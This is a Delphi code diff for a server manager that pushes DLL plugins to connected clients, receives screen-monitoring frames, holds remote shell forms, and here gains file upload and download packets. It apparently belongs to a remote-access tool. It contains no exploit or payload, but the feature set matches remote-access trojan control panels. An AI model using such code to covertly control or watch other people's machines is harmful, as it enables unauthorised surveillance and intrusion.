@@ -28,9 +28,15 @@ const
   PACKET_TYPE_JSON            = $01;
   PACKET_TYPE_DLL             = $02;
   PACKET_TYPE_MONITOR_FRAME   = $03;
+  PACKET_TYPE_FILE_UPLOAD     = $04;
+  PACKET_TYPE_FILE_DOWNLOAD   = $05;
   MONITOR_FRAME_FORMAT_JPEG   = 1;
 
 type
+  TBinaryPacket = record
+    PacketType: Byte;
+    Payload: TBytes;
+  end;
 
   // Binary packet header - must match PacketHeader in C++ side
   TPacketHeader = packed record
@@ -107,10 +113,10 @@ type
                              const aBuf: TBytes; aBufCount: Integer);
     procedure ProcessJSONMessage(aLine: TncLine; const RawStr: string);
     procedure ProcessMonitoringBinaryFrame(aLine: TncLine; const Payload: TBytes);
+    procedure ProcessFileManagerBinaryPacket(aLine: TncLine; PacketType: Byte; const Payload: TBytes);
     procedure OnHeartbeat(Sender: TObject);
     procedure DisconnectLine(aLine: TncLine);
     procedure SendPing(aLine: TncLine);
-    procedure SendBinaryPacket(aLine: TncLine; PacketType: Byte; const Data: TBytes);
     procedure DoLog(Category: TLogCategory; const Msg: string);
     procedure DetachProcessForms;
     procedure DetachRemoteShellForms;
@@ -126,6 +132,7 @@ type
     procedure Start(Port: Integer);
     procedure Stop;
     procedure SendJSON(aLine: TncLine; JSONObj: TJSONObject);
+    procedure SendBinaryPacket(aLine: TncLine; PacketType: Byte; const Data: TBytes);
     procedure SendPlugin(aLine: TncLine; const PluginID: string);
     procedure SendInformationPlugin(aLine: TncLine);
     procedure SendProcessManagerPlugin(aLine: TncLine);
@@ -664,6 +671,42 @@ begin
   end;
 end;
 
+procedure TServerManager.SendBinaryPacket(aLine: TncLine; PacketType: Byte; const Data: TBytes);
+var
+  Header : TPacketHeader;
+  SendBuf: TBytes;
+  DataLen: Integer;
+  IP     : string;
+  Info   : TClientInfo;
+begin
+  DataLen           := Length(Data);
+  Header.Signature  := $524E; // 'NR'
+  Header.PacketType := PacketType;
+  Header.Size       := Cardinal(DataLen);
+
+  SetLength(SendBuf, SizeOf(TPacketHeader) + DataLen);
+  Move(Header, SendBuf[0], SizeOf(TPacketHeader));
+  if DataLen > 0 then
+    Move(Data[0], SendBuf[SizeOf(TPacketHeader)], DataLen);
+
+  IP := '';
+  if TryGetClientInfo(aLine, Info) then
+    IP := Info.IPAddress;
+
+  FLock.Enter;
+  try
+    if FClients.ContainsKey(aLine) then
+    try
+      TncLineAccess(aLine).SendBuffer(SendBuf[0], Length(SendBuf));
+    except
+      on E: Exception do
+        DoLog(lcError, 'Binary send error [' + IP + ']: ' + E.Message);
+    end;
+  finally
+    FLock.Leave;
+  end;
+end;
+
 procedure TServerManager.SendJSON(aLine: TncLine; JSONObj: TJSONObject);
 var
   DataStr  : string;
@@ -695,42 +738,6 @@ begin
     except
       on E: Exception do
         DoLog(lcError, 'JSON send error [' + IP + ']: ' + E.Message);
-    end;
-  finally
-    FLock.Leave;
-  end;
-end;
-
-procedure TServerManager.SendBinaryPacket(aLine: TncLine; PacketType: Byte; const Data: TBytes);
-var
-  Header : TPacketHeader;
-  SendBuf: TBytes;
-  DataLen: Integer;
-  IP     : string;
-  Info   : TClientInfo;
-begin
-  DataLen           := Length(Data);
-  Header.Signature  := $524E; // 'NR'
-  Header.PacketType := PacketType;
-  Header.Size       := Cardinal(DataLen);
-
-  SetLength(SendBuf, SizeOf(TPacketHeader) + DataLen);
-  Move(Header, SendBuf[0], SizeOf(TPacketHeader));
-  if DataLen > 0 then
-    Move(Data[0], SendBuf[SizeOf(TPacketHeader)], DataLen);
-
-  IP := '';
-  if TryGetClientInfo(aLine, Info) then
-    IP := Info.IPAddress;
-
-  FLock.Enter;
-  try
-    if FClients.ContainsKey(aLine) then
-    try
-      TncLineAccess(aLine).SendBuffer(SendBuf[0], Length(SendBuf));
-    except
-      on E: Exception do
-        DoLog(lcError, 'Binary send error [' + IP + ']: ' + E.Message);
     end;
   finally
     FLock.Leave;
@@ -809,7 +816,7 @@ begin
   end;
 
   DoLog(lcCommand, '"' + PluginID + '" sent to ' + IP);
-  SendBinaryPacket(aLine, $02, DLLData);
+  SendBinaryPacket(aLine, PACKET_TYPE_DLL, DLLData);
 end;
 
 procedure TServerManager.SendInformationPlugin(aLine: TncLine);
@@ -947,13 +954,14 @@ var
   LineBytes    : TBytes;
   LineText     : string;
   Messages     : TList<string>;
-  BinaryFrames : TList<TBytes>;
+  BinaryPackets: TList<TBinaryPacket>;
+  BP           : TBinaryPacket;
 begin
   if (aBufCount <= 0) then
     Exit;
 
-  Messages     := TList<string>.Create;
-  BinaryFrames := TList<TBytes>.Create;
+  Messages      := TList<string>.Create;
+  BinaryPackets := TList<TBinaryPacket>.Create;
   try
     FLock.Enter;
     try
@@ -989,10 +997,14 @@ begin
             if Header.Size > 0 then
               Move(Buffer[SizeOf(TPacketHeader)], Payload[0], Header.Size);
 
-            if Header.PacketType = PACKET_TYPE_MONITOR_FRAME then
-              BinaryFrames.Add(Payload)
-            else if Header.PacketType = PACKET_TYPE_JSON then
-              Messages.Add(TEncoding.UTF8.GetString(Payload));
+            if Header.PacketType = PACKET_TYPE_JSON then
+              Messages.Add(TEncoding.UTF8.GetString(Payload))
+            else
+            begin
+              BP.PacketType := Header.PacketType;
+              BP.Payload := Payload;
+              BinaryPackets.Add(BP);
+            end;
 
             ConsumeBytes(Buffer, PacketSize);
             Continue;
@@ -1033,10 +1045,15 @@ begin
     for LineText in Messages do
       ProcessJSONMessage(aLine, LineText);
 
-    for Payload in BinaryFrames do
-      ProcessMonitoringBinaryFrame(aLine, Payload);
+    for BP in BinaryPackets do
+    begin
+      if BP.PacketType = PACKET_TYPE_MONITOR_FRAME then
+        ProcessMonitoringBinaryFrame(aLine, BP.Payload)
+      else if BP.PacketType = PACKET_TYPE_FILE_DOWNLOAD then
+        ProcessFileManagerBinaryPacket(aLine, BP.PacketType, BP.Payload);
+    end;
   finally
-    BinaryFrames.Free;
+    BinaryPackets.Free;
     Messages.Free;
   end;
 end;
@@ -1069,6 +1086,21 @@ begin
   MonitoringForm := GetMonitoringForm(aLine);
   if Assigned(MonitoringForm) then
     MonitoringForm.QueueFrameBytes(FrameBytes);
+end;
+
+procedure TServerManager.ProcessFileManagerBinaryPacket(aLine: TncLine; PacketType: Byte; const Payload: TBytes);
+var
+  FileManagerForm: TForm9;
+begin
+  FileManagerForm := GetFileManagerForm(aLine);
+  if Assigned(FileManagerForm) then
+  begin
+    var CapturedPayload := Payload;
+    QueueToUI(procedure
+    begin
+      FileManagerForm.HandleBinaryPacket(PacketType, CapturedPayload);
+    end);
+  end;
 end;
 
 procedure TServerManager.ProcessJSONMessage(aLine: TncLine; const RawStr: string);
